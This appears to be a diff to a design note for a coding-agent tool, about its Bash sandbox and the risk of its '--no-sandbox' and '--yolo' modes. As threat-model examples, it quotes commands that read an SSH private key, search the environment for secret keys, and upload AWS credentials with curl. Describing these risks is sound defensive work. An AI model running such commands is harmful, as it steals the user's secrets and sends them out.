@@ -9,7 +9,8 @@ Promote an entry into its own idea file, or a fix, when the friction shows up.
 `Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
 readable/writable roots + an OS-runtime baseline, and is the default in
 `bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
-there `cat ~/.ssh/id_rsa`, `env | grep -i key`,
+there `cat ~/.ssh/id_rsa`, `env | grep -i key` (the sandbox withholds exported
+tokens, `D_sandbox_env_wall`; without it they are all there),
 `curl --upload-file ~/.aws/credentials ...` all run as the user, and
 the per-command Confirmer is the only line of defense (`--yolo`
 disables that too). The help text says "use only with an outer
